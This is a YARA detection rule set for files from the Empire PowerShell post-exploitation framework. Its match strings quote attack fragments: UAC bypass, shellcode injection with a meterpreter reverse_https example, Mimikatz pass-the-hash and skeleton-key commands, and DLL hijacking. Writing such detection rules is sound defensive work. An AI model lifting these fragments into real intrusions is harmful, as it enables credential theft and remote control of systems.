/*
    Yara Rule Set
    Author: Florian Roth
    Date: 2015-08-07
    Identifier: Empire Powershell Agent
    Comment: Reduced Subset
*/

rule Empire_Invoke_BypassUAC {
    meta:
        id = "5gnXCkVPOBXt5w24zRCv5O"
        fingerprint = "v1_sha256_1697065405fa0e255cdd77fa39f53866118caf0bad6a3d72756590303610e7b6"
        version = "1.0"
        score = 70
        date = "2015-08-06"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Empire - a pure PowerShell post-exploitation agent - file Invoke-BypassUAC.ps1"
        category = "INFO"
        reference = "https://github.com/PowerShellEmpire/Empire"
        hash = "ab0f900a6915b7497313977871a64c3658f3e6f73f11b03d2d33ca61305dc6a8"

    strings:
        $s1 = "$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory" fullword ascii 
        $s2 = "$proc = Start-Process -WindowStyle Hidden notepad.exe -PassThru" fullword ascii 
        $s3 = "$Payload = Invoke-PatchDll -DllBytes $Payload -FindString \"ExitThread\" -ReplaceString \"ExitProcess\"" fullword ascii 
        $s4 = "$temp = [System.Text.Encoding]::UNICODE.GetBytes($szTempDllPath)" fullword ascii 
    condition:
        filesize < 1200KB and 3 of them
}

rule Empire_lib_modules_trollsploit_message {
    meta:
        id = "6Vl6OBeWd5QmoYh8c8BLhv"
        fingerprint = "v1_sha256_70b7d91395ae30131c1448511425abf32ddedf04632266454aa008330ff28222"
        version = "1.0"
        score = 70
        date = "2015-08-06"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Empire - a pure PowerShell post-exploitation agent - file message.py"
        category = "INFO"
        reference = "https://github.com/PowerShellEmpire/Empire"
        hash = "71f2258177eb16eafabb110a9333faab30edacf67cb019d5eab3c12d095655d5"

    strings:
        $s1 = "script += \" -\" + str(option) + \" \\\"\" + str(values['Value'].strip(\"\\\"\")) + \"\\\"\"" fullword ascii 
        $s2 = "if option.lower() != \"agent\" and option.lower() != \"computername\":" fullword ascii 
        $s3 = "[String] $Title = 'ERROR - 0xA801B720'" fullword ascii 
        $s4 = "'Value'         :   'Lost contact with the Domain Controller.'" fullword ascii 
    condition:
        filesize < 10KB and 3 of them
}

rule Empire_Persistence {
    meta:
        id = "1vOKEsRaVdnRlavsHzhxFa"
        fingerprint = "v1_sha256_3c398aa180b6f2225a25f9b1430e89991c7e391930e2be140e89c67da67b3614"
        version = "1.0"
        score = 70
        date = "2015-08-06"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Empire - a pure PowerShell post-exploitation agent - file Persistence.psm1"
        category = "INFO"
        reference = "https://github.com/PowerShellEmpire/Empire"
        hash = "ae8875f7fcb8b4de5cf9721a9f5a9f7782f7c436c86422060ecdc5181e31092f"

    strings:
        $s1 = "C:\\PS>Add-Persistence -ScriptBlock $RickRoll -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -V" ascii 
        $s2 = "# Execute the following to remove the user-level persistent payload" fullword ascii 
        $s3 = "$PersistantScript = $PersistantScript.ToString().Replace('EXECUTEFUNCTION', \"$PersistenceScriptName -Persist\")" fullword ascii 
    condition:
        filesize < 108KB and 1 of them
}

rule Empire_portscan {
    meta:
        id = "KE5WB15oOHAuydXxeGCfB"
        fingerprint = "v1_sha256_162ac4ccc8629a2d017831cdc6d1bf8d7a62b844bf68a0d61956b2f41a5e004b"
        version = "1.0"
        score = 70
        date = "2015-08-06"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Empire - a pure PowerShell post-exploitation agent - file portscan.py"
        category = "INFO"
        reference = "https://github.com/PowerShellEmpire/Empire"
        hash = "b355efa1e7b3681b1402e22c58ce968795ef245fd08a0afb948d45c173e60b97"

    strings:
        $s1 = "script += \"Invoke-PortScan -noProgressMeter -f\"" fullword ascii 
        $s2 = "script += \" | ? {$_.alive}| Select-Object HostName,@{name='OpenPorts';expression={$_.openPorts -join ','}} | ft -wrap | Out-Str" ascii 
    condition:
        filesize < 14KB and all of them
}

rule Empire_Invoke_Shellcode {
    meta:
        id = "LcOCXfcDYSIhmmHpkf4Rv"
        fingerprint = "v1_sha256_968a140f75aa17bd9aac243483cade931dc047854b65b2f61146492c2cf01ea5"
        version = "1.0"
        score = 70
        date = "2015-08-06"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Empire - a pure PowerShell post-exploitation agent - file Invoke-Shellcode.ps1"
        category = "INFO"
        reference = "https://github.com/PowerShellEmpire/Empire"
        hash = "fa75cfd57269fbe3ad6bdc545ee57eb19335b0048629c93f1dc1fe1059f60438"

    strings:
        $s1 = "C:\\PS> Invoke-Shellcode -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 443 -Verbos" ascii 
        $s2 = "\"Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!\" ) )" fullword ascii 
        $s3 = "$RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)" fullword ascii 
    condition:
        filesize < 100KB and 1 of them
}

rule Empire_Invoke_Mimikatz {
    meta:
        id = "6zGCWR1spPhOZrmfVjxRU8"
        fingerprint = "v1_sha256_3e16bed3dd7b36920cdf01507f35e38d004e3ce2f3301911a8ee4aedbae6c5c3"
        version = "1.0"
        score = 70
        date = "2015-08-06"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Empire - a pure PowerShell post-exploitation agent - file Invoke-Mimikatz.ps1"
        category = "INFO"
        reference = "https://github.com/PowerShellEmpire/Empire"
        hash = "c5481864b757837ecbc75997fa24978ffde3672b8a144a55478ba9a864a19466"

    strings:
        $s1 = "$PEBytes64 = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwc" ascii 
        $s2 = "[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)" fullword ascii 
        $s3 = "Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp" fullword ascii 
    condition:
        filesize < 2500KB and 2 of them
}

rule Empire_lib_modules_credentials_mimikatz_pth {
    meta:
        id = "7gFEHLXK0JYkn8pneOxdz8"
        fingerprint = "v1_sha256_6989c2e50ce642e0300e1293f46cd36e5141274d1e7172a8312595bb515bede2"
        version = "1.0"
        score = 70
        date = "2015-08-06"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Empire - a pure PowerShell post-exploitation agent - file pth.py"
        category = "INFO"
        reference = "https://github.com/PowerShellEmpire/Empire"
        hash = "6dee1cf931e02c5f3dc6889e879cc193325b39e18409dcdaf987b8bf7c459211"

    strings:
        $s0 = "(credID, credType, domainName, userName, password, host, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]" fullword ascii 
        $s1 = "command = \"sekurlsa::pth /user:\"+self.options[\"user\"]['Value']" fullword ascii 
    condition:
        filesize < 12KB and all of them
}

rule Empire_Write_HijackDll {
    meta:
        id = "163URNo7Cz70pKRtGzdj0B"
        fingerprint = "v1_sha256_e01157fe4adaf647474292bfbbb8196c0b7e89433da52a386a8d9573ae543679"
        version = "1.0"
        score = 70
        date = "2015-08-06"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Empire - a pure PowerShell post-exploitation agent - file Write-HijackDll.ps1"
        category = "INFO"
        reference = "https://github.com/PowerShellEmpire/Empire"
        hash = "155fa7168e28f15bb34f67344f47234a866e2c63b3303422ff977540623c70bf"

    strings:
        $s1 = "$DllBytes = Invoke-PatchDll -DllBytes $DllBytes -FindString \"debug.bat\" -ReplaceString $BatchPath" fullword ascii 
        $s2 = "$DllBytes32 = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAA4fug4AtAnNIbgBTM0hVGhpcyBw" ascii 
        $s3 = "[Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)" fullword ascii 
    condition:
        filesize < 500KB and 2 of them
}

rule Empire_skeleton_key {
    meta:
        id = "7Ipk5lFoTRDChNeOdYLnGc"
        fingerprint = "v1_sha256_910451b2b2ed7cb5f7891d97d15e49da24b182adc903926f539fc4bfe589f2d5"
        version = "1.0"
        score = 70
        date = "2015-08-06"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Empire - a pure PowerShell post-exploitation agent - file skeleton_key.py"
        category = "INFO"
        reference = "https://github.com/PowerShellEmpire/Empire"
        hash = "3d02f16dcc38faaf5e97e4c5dbddf761f2816004775e6af8826cde9e29bb750f"

    strings:
        $s1 = "script += \"Invoke-Mimikatz -Command '\\\"\" + command + \"\\\"';\"" fullword ascii 
        $s2 = "script += '\"Skeleton key implanted. Use password \\'mimikatz\\' for access.\"'" fullword ascii 
        $s3 = "command = \"misc::skeleton\"" fullword ascii 
        $s4 = "\"ONLY APPLICABLE ON DOMAIN CONTROLLERS!\")," fullword ascii 
    condition:
        filesize < 6KB and 2 of them
}

rule Empire_invoke_wmi {
    meta:
        id = "5v4g9EPVFgsNikvuL1AVZw"
        fingerprint = "v1_sha256_7179a22eec8eb9e59bf590e671e6849d5b960c58eb8fa591bc3b340d64f1d076"
        version = "1.0"
        score = 70
        date = "2015-08-06"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Empire - a pure PowerShell post-exploitation agent - file invoke_wmi.py"
        category = "INFO"
        reference = "https://github.com/PowerShellEmpire/Empire"
        hash = "a914cb227f652734a91d3d39745ceeacaef7a8b5e89c1beedfd6d5f9b4615a1d"

    strings:
        $s1 = "(credID, credType, domainName, userName, password, host, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]" fullword ascii 
        $s2 = "script += \";'Invoke-Wmi executed on \" +computerNames +\"'\"" fullword ascii 
        $s3 = "script = \"$PSPassword = \\\"\"+password+\"\\\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Man" ascii 
    condition:
        filesize < 20KB and 2 of them
}
